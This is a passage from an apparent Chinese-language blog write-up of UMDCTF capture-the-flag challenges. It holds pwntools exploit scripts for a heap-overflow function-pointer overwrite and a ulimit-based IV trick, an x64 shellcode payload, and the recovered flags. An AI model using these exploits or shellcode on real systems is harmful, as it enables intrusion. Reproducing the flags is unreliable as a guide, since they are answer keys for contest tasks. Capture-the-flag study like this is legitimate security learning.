 <h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution:"></a>Solution:</h3><p>程序保护如下：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
 
+
+
 <p><strong>源码如下：</strong></p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/conf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_file</span><span class="params">(<span class="keyword">char</span> * buffer, FILE *f, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">char</span> c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">    c = fgetc(f);</span><br><span class="line">    <span class="keyword">if</span> (feof(f)) </span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    buffer[i] = c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handleErrors</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ERR_print_errors_fp(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plaintext, <span class="keyword">int</span> plaintext_len, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">unsigned</span> <span class="keyword">char</span> *iv, <span class="keyword">unsigned</span> <span class="keyword">char</span> *ciphertext)</span> </span>&#123;</span><br><span class="line">  EVP_CIPHER_CTX *ctx;</span><br><span class="line">  <span class="keyword">int</span> len;</span><br><span class="line">  <span class="keyword">int</span> ciphertext_len;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!(ctx = EVP_CIPHER_CTX_new()))</span><br><span class="line">    handleErrors();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="number">1</span> != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), <span class="literal">NULL</span>, key, iv)) </span><br><span class="line">    handleErrors();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="number">1</span> != EVP_EncryptUpdate(ctx, ciphertext, &amp;len, plaintext, plaintext_len))</span><br><span class="line">    handleErrors();</span><br><span class="line">  ciphertext_len = len;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="number">1</span> != EVP_EncryptFinal_ex(ctx, ciphertext + len, &amp;len)) </span><br><span class="line">    handleErrors();</span><br><span class="line">  ciphertext_len += len;</span><br><span class="line"></span><br><span class="line">  EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">  <span class="keyword">return</span> ciphertext_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;, iv[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;, flag[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;, ctxt[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  FILE *i = <span class="literal">NULL</span>, *f = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>, clen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  f = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  i = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"r"</span>);  </span><br><span class="line">  </span><br><span class="line">  result = read_file(flag, f, <span class="number">64</span>);</span><br><span class="line">  result = read_file(iv, i, <span class="number">16</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">strncpy</span>(key, <span class="string">"HARCODED KEY CAUSE IM LAZY TODAY"</span>, <span class="number">32</span>);</span><br><span class="line">  clen = encrypt(flag, <span class="built_in">strlen</span>(flag), key, iv, ctxt);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Pretty Ciphertext: \n"</span>);</span><br><span class="line">  BIO_dump_fp (<span class="built_in">stdout</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)ctxt, clen);</span><br><span class="line">  </span><br><span class="line">  fclose(f);</span><br><span class="line">  fclose(i);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p>没做出来，后来在 discord 上面询问后才会做，师傅原话如下：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ysf 今天22:56</span><br><span class="line">You win crypto? by setting <span class="built_in">ulimit</span> -n 6 on the server.</span><br><span class="line">that way /dev/urandom can<span class="string">'t be opened and the flag will be encrypted with a known key = &lt;in the file&gt; and a known IV = 0000....</span></span><br><span class="line"><span class="string">you can decrypt the output with those settings via cyberchef</span></span><br><span class="line"><span class="string">those two lines took me maybe 5h to find</span></span><br></pre></td></tr></table></figure>
 
+
+
 <p>师傅的意思就是要通过 ulimit 命令限制能打开的文件描述符数量</p>
+
 <p>只要达到能打开题目文件而不能打开 urandom 文件的值的话，就会因为不能访问使 iv 的值变成<code>&#39;\x00&#39; * 16</code></p>
+
 <p>然后就啥都知道了，直接 aes 解密就完了</p>
+
 <p>我的操作如下：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@lepPwn:~/Environment/H1ve<span class="comment"># nc 192.241.138.174 9997</span></span><br><span class="line">ls -la</span><br><span class="line">total 2772</span><br><span class="line">drwxr-x--- 1 0 1000    4096 Apr 17 03:13 .</span><br><span class="line">drwxr-x--- 1 0 1000    4096 Apr 17 03:13 ..</span><br><span class="line">-rwxr-x--- 1 0 1000     220 Apr  4  2018 .bash_logout</span><br><span class="line">-rwxr-x--- 1 0 1000    3771 Apr  4  2018 .bashrc</span><br><span class="line">-rwxr-x--- 1 0 1000     807 Apr  4  2018 .profile</span><br><span class="line">drwxr-x--- 1 0 1000    4096 Apr 16 03:19 bin</span><br><span class="line">drwxr-x--- 1 0 1000    4096 Apr 16 03:19 dev</span><br><span class="line">-rwx------ 1 0    0      33 Apr 13 18:46 flag.txt</span><br><span class="line">drwxr-x--- 1 0 1000    4096 Apr 16 03:19 lib</span><br><span class="line">drwxr-x--- 1 0 1000    4096 Apr 16 03:19 lib32</span><br><span class="line">drwxr-x--- 1 0 1000    4096 Apr 16 03:19 lib64</span><br><span class="line">-rwsr-x--- 1 0 1000 2793280 Apr 17 03:11 questionable</span><br><span class="line"><span class="built_in">ulimit</span> -n 4</span><br><span class="line">./questionable</span><br><span class="line">Pretty Ciphertext: </span><br><span class="line">0000 - b6 fe 8c 31 c5 55 ce cf-0b 6c d3 94 30 9d d7 12   ...1.U...l..0...</span><br><span class="line">0010 - 96 aa 1b 20 <span class="built_in">cd</span> b1 1b 2e-51 57 2f 33 09 62 3f cf   ... ....QW/3.b?.</span><br><span class="line">0020 - ab 6a c0 4f d6 91 91 13-a3 ae ad 64 c8 4a 50 73   .j.O.......d.JPs</span><br><span class="line">/bin/bash: line 3: 19634 Segmentation fault      (core dumped) ./questionable</span><br><span class="line">./questionable</span><br><span class="line">Pretty Ciphertext: </span><br><span class="line">0000 - b6 fe 8c 31 c5 55 ce cf-0b 6c d3 94 30 9d d7 12   ...1.U...l..0...</span><br><span class="line">0010 - 96 aa 1b 20 <span class="built_in">cd</span> b1 1b 2e-51 57 2f 33 09 62 3f cf   ... ....QW/3.b?.</span><br><span class="line">0020 - ab 6a c0 4f d6 91 91 13-a3 ae ad 64 c8 4a 50 73   .j.O.......d.JPs</span><br><span class="line">/bin/bash: line 4: 19635 Segmentation fault      (core dumped) ./questionable</span><br></pre></td></tr></table></figure>
 
+
+
 <p>完全没问题，开心拿到 flag 也学到了新知识</p>
+
 <p><strong>exp 如下：</strong></p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prpcrypt</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, iv)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.iv = iv</span><br><span class="line">        self.mode = AES.MODE_CBC</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        cryptor = AES.new(self.key, self.mode, self.iv)</span><br><span class="line">        plain_text = cryptor.decrypt(binascii.unhexlify(text))</span><br><span class="line">        <span class="keyword">return</span> plain_text.rstrip(<span class="string">'\0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="string">"b6fe8c31c555cecf0b6cd394309dd71296aa1b20cdb11b2e51572f3309623fcfab6ac04fd6919113a3aead64c84a5073"</span></span><br><span class="line">pc = prpcrypt(<span class="string">'HARCODED KEY CAUSE IM LAZY TODAY'</span>, <span class="string">'\x00'</span> * <span class="number">16</span>)</span><br><span class="line">d = pc.decrypt(e)</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure>
 
+
+
 <hr>
+
 <h3 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF-&#123;n0t_r4nd0m_3N0UGH_f0r_U&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <h2 id="Jump-Not-Found"><a href="#Jump-Not-Found" class="headerlink" title="Jump Not Found"></a>Jump Not Found</h2><h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+
 <p>We are trying to make a hyper jump to Naboo, but our system doesn’t know where Naboo is. Can you help us figure out the issue?<br><br>nc 192.241.138.174 9996<br><br>Author: WittsEnd2</p>
+
 </blockquote>
+
 <hr>
+
 <h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution:"></a>Solution:</h3><p>程序保护如下：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 
+
+
 <p><strong>main 函数如下：</strong></p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> **v3; <span class="comment">// rsi</span></span><br><span class="line">  __int16 v4; <span class="comment">// ax</span></span><br><span class="line">  __int16 v5; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">char</span> *endptr; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> *nptr; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall **v8)(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> **); <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  nptr = <span class="built_in">malloc</span>(<span class="number">0x42</span>uLL);</span><br><span class="line">  v8 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  *v8 = jumpToHoth;</span><br><span class="line">  v8[<span class="number">1</span>] = jumpToCoruscant;</span><br><span class="line">  v8[<span class="number">2</span>] = jumpToEndor;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"SYSTEM CONSOLE&gt; "</span>, v3);</span><br><span class="line">      gets(nptr);</span><br><span class="line">      v3 = &amp;endptr;</span><br><span class="line">      v4 = strtol(nptr, &amp;endptr, <span class="number">10</span>);</span><br><span class="line">      *(nptr + <span class="number">0x20</span>) = v4;</span><br><span class="line">      v5 = *(nptr + <span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Checking navigation..."</span>);</span><br><span class="line">      v8[<span class="number">1</span>](<span class="string">"Checking navigation..."</span>, &amp;endptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Checking navigation..."</span>);</span><br><span class="line">        v8[<span class="number">2</span>](<span class="string">"Checking navigation..."</span>, &amp;endptr);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Logging out"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_14:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Check Systems"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"1 - Hoth"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"2 - Coruscant"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"3 - Endor"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"4 - Logout"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Checking navigation..."</span>);</span><br><span class="line">      (*v8)(<span class="string">"Checking navigation..."</span>, &amp;endptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p>有个后门函数</p>
+
 <p><strong>jumpToNaboo 函数如下：</strong></p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">jumpToNaboo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Jumping to Naboo...\n UMDCTF-&#123; flag on server             &#125;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p>简单的堆溢出利用</p>
+
 <p>后门函数地址带<code>\x0a</code>，在 gets 函数里会被截断，所以要往下取一点</p>
+
 <p><strong>exp 如下：</strong></p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./JNF'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'192.241.138.174'</span>, <span class="number">9996</span>)</span><br><span class="line">addr_target = <span class="number">0x40070E</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x40079B\nc")</span></span><br><span class="line">pd = <span class="string">'\x00'</span></span><br><span class="line">pd = pd.ljust(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">pd += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pd += p64(addr_target) * <span class="number">2</span></span><br><span class="line">p.sendlineafter(<span class="string">'CONSOLE&gt; '</span>, pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
 <hr>
+
 <h3 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF-&#123;S3tt1ng_C00rd1nat3s_T0_NaBOO&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <h2 id="shellcodia2"><a href="#shellcodia2" class="headerlink" title="shellcodia2"></a>shellcodia2</h2><h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+
 <p>Welcome back to shellcodia! You know the drill. Simply connect, submit your shellcode in binary form, and if you’ve completed the challenge then a flag will return. This challenge requires you to create a file named strange.txt and put the string awesome inside.<br><br>Now, a few things to remember, these are x64 machines so don’t think you can sneak by with 32bit shellcode. Additionally, the environment assumes nothing about the shellcode you give it. It’s highly unlikely that if you break the environment, even if you accomplished the goal, you will get the flag.<br><br>Submit your shellcode to: 157.245.88.100:7779<br><br>Good luck!<br><br>Author: quantumite (BlueStar)<br><br>(Note: flag is in UMDCTF{} format)</p>
+
 </blockquote>
+
 <hr>
+
 <h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution:"></a>Solution:</h3><p>写了个 ret2shellcode 的本地程序自测了一下</p>
+
 <p><strong>exp 如下：</strong></p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">pd = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">mov rdi, rdx</span></span><br><span class="line"><span class="string">add rdi, 0x80</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rax, SYS_creat</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rsi, rdi</span></span><br><span class="line"><span class="string">add rsi, 0x10</span></span><br><span class="line"><span class="string">mov rdx, 7</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">mov rax, SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">pd = pd.ljust(<span class="number">0x80</span>, <span class="string">'\x00'</span>)</span><br><span class="line">pd += <span class="string">'strange.txt'</span>.ljust(<span class="number">0x10</span>, <span class="string">'\x00'</span>)</span><br><span class="line">pd += <span class="string">'awesome'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./shellcode_environ'</span>)</span><br><span class="line">    gdb.attach(p, <span class="string">"b *0x4005ec\nc"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'qwwww\n'</span>, <span class="string">'binLep'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'emmmm'</span>, pd)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'157.245.88.100'</span>, <span class="number">7779</span>)</span><br><span class="line">    p.sendline(pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
 <hr>
+
 <h3 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF&#123;uu_rr_ G3tt1nG_g00d_w1tH_Th1s_<span class="variable">$h3llc0de_stUff</span>&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <h2 id="Coal-Miner"><a href="#Coal-Miner" class="headerlink" title="Coal Miner"></a>Coal Miner</h2><h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+
 <p>First to fall over when the atmosphere is less than perfect<br><br>Your sensibilities are shaken by the slightest defect<br><br>nc 161.35.8.211 9999<br><br>Author: moogboi</p>
+
 </blockquote>
+
 <hr>
+
 <h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution:"></a>Solution:</h3><p>程序保护如下：</p>
+
